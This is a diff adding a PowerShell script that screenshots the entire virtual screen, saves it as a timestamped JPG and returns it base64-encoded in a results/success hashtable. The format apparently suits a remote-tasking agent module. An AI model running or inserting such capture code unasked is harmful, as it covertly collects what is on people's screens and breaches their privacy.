@@ -1,0 +1,64 @@
+
+
+
+
+
+
+
+function invoke-screenshot {
+    $results = ""
+    $good = $false
+
+    
+
+    $pictureFile = ".\screenshot-"+"$(get-date -f dd-HH-mm-ss).jpg"
+    
+
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    
+
+    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $width = $screen.Width
+    $height = $screen.Height
+    $left = $screen.Left
+    $top = $screen.Top
+    
+
+    $picture = New-Object System.Drawing.Bitmap $width, $height
+    
+
+    $graphic = [System.Drawing.Graphics]::FromImage($picture)
+    
+
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $picture.Size)
+    
+
+    $picture.Save($pictureFile) 
+    
+
+
+    if([System.IO.File]::Exists($pictureFile)){
+        $good = $true
+        
+
+        $content = Get-Content $pictureFile -Encoding byte
+        $results = [convert]::ToBase64String($content)
+    }
+
+    return @{results = $results; success = $good }
+}
+
+
+
+
+
+
+
+
+
+$execute = invoke-screenshot
+return @{results = $execute.results; success = $execute.success; }
+
+
+
